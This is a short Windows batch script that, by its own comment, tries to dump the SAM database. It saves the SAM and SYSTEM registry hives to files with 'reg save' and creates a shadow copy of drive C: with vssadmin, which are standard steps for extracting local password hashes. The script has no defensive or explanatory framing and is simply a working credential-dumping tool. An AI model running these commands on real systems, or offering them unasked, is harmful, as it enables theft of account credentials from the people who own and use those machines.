:: A batch script that attempts to dump the SAM database via registry
@echo off
echo Attempting to dump SAM...
reg save HKLM\SAM sam_dump.hive
reg save HKLM\SYSTEM system_dump.hive

:: Triggering vssadmin shadow copy
vssadmin create shadow /for=C:
echo Done accessing \system32\config\SAM
